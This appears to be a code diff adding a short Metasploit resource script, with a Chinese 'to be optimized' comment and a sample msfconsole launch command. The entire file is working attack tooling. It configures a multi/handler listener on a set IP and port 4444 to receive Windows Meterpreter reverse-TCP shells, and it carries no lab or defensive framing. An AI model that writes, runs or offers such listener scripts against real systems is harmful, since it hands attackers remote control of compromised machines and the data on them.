@@ -1,0 +1,11 @@
+ip = 192.168.1.100
+port = 4444
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST $ip
+set LPORT $port
+run
+
+# 待优化
+# msfconsole -r msf_reverse_tcp.rc
